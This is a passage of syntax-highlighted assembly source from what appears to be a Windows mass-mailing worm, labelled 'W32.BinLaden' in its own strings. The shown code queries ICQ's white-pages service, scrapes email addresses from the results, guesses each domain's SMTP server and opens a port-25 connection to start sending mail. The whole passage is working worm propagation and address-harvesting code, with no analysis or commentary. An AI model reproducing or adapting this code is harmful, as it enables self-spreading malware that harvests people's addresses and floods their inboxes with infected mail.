            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">INTERNET_OPEN_TYPE_DIRECT</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">STRbinladen</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'W32.BinLaden'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">STRbinladen</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetOpenA</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndIcqSMail</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ICQInetOpenHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">STRWhitPage</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'http://wwp.icq.com/scripts/white.dll?int=0&amp;keyword='</span><span class="sc0">
</span><span class="sc5">KeyWord</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">STRWhitPage</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ICQInetOpenHandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetOpenUrlA</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndIcqSMail</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ICQInetUrlHandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">MailLoop</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BytesToDownload</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ICQInetUrlHandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetQueryDataAvailable</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BytesToDownload</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;  end?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">;  error?</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
            </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">GetNetBlock</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetNetAvail</span><span class="sc0">

</span><span class="sc5">GetNetBlock</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0">
</span><span class="sc5">GetNetAvail</span><span class="sc4">:</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">BytesInternetRead</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BufferInternetRead</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ICQInetUrlHandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetReadFile</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BytesInternetRead</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ClsUrlHndle</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">BytesToDownload</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc1">; process email to &lt;EmailEntryList&gt;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EmailEntryList</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">BufferInternetRead</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">ScanIT</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">MailLoop</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'iam"'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanIT</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">

</span><span class="sc1">;&lt;a href="mailto:"&gt; --&gt; exemplo de usuario sem email</span><span class="sc0">
</span><span class="sc1">;&lt;a href="mailto:suce7@libertysurf.fr"&gt; --&gt; com email</span><span class="sc0">

            </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">':otl'</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">ScanIT</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ScanIT</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">PointerEmailBuff1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">PointerEmailBuff2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40</span><span class="sc0">
</span><span class="sc5">copyemail</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'"'</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">copydone</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">nolow</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">
            </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">chlow</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
            </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">nolow</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">
            </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">nolow</span><span class="sc0">

</span><span class="sc5">chlow</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">nolow</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">copyemail</span><span class="sc0">
            </span><span class="sc1">; error, restore email buffer</span><span class="sc0">
</span><span class="sc5">savedpoint</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerEmailBuff1</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerEmailBuff2</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ScanIT</span><span class="sc0">

</span><span class="sc5">copydone</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">PointerEmailBuff1</span><span class="sc0"> </span><span class="sc1">;  string size            </span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;  0ffh</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EmailEntryList</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">.smtp0</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ScanIT</span><span class="sc0">

</span><span class="sc5">ClsUrlHndle</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ICQInetUrlHandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetCloseHandle</span><span class="sc0">

</span><span class="sc5">ClsOpenHndl</span><span class="sc4">:</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ICQInetOpenHandle</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InternetCloseHandle</span><span class="sc0">

</span><span class="sc5">x_closeskt</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">ICQNow</span><span class="sc0">

</span><span class="sc1">;           let's try to get some SMTP servers</span><span class="sc0">

</span><span class="sc5">.smtp0</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">saved_esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EmailEntryList</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServerSMTP</span><span class="sc0">
</span><span class="sc5">x_smtp1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">;  0ffh</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">smtpcopied</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">x_smtp1</span><span class="sc0">

</span><span class="sc5">smtpcopied</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServerSMTP</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'@'</span><span class="sc0">
            </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
     </span><span class="sc1">;EDI = @+1</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">smtpseeker</span><span class="sc0">

            </span><span class="sc5">smtp1</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'smtp.'</span><span class="sc0">
            </span><span class="sc5">ServerSMTP01</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">smtp2</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'mail.'</span><span class="sc0">
            </span><span class="sc5">ServerSMTP02</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">30</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">smtpseeker</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServerSMTP01</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ServerSMTP02</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">startOK</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">lpWSADATA</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">101h</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@ret</span><span class="sc0">

</span><span class="sc5">startOK</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">INVALID_SOCKET</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@ret</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">socketOK</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

            </span><span class="sc1">;  invalid host ?</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@ret</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp1</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SmtpFound</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">smtp2</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">gethostbyname</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">SmtpFound</span><span class="sc0">

            </span><span class="sc1">;  try connection with default host</span><span class="sc0">

</span><span class="sc5">NewServer</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc5">SmtpFound</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">SmtpHost</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">sockaddr</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">019000002h</span><span class="sc0">
</span><span class="sc5">SmtpHost</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">sockaddr</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc0">

            </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">HandShake</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">

            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">SmtpHost</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">NewServer</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@ret</span><span class="sc0">

            </span><span class="sc1">;  hand-shake starts here</span><span class="sc0">

</span><span class="sc5">HandShake</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rnd_eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_server</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f0fh</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'AAAA'</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">rnd_server</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">helo_sz</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heloserver</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">send_x</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">recv_x</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">heloserver_after</span><span class="sc0">

</span><span class="sc5">heloserver</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'HELO ????????'</span><span class="sc0">
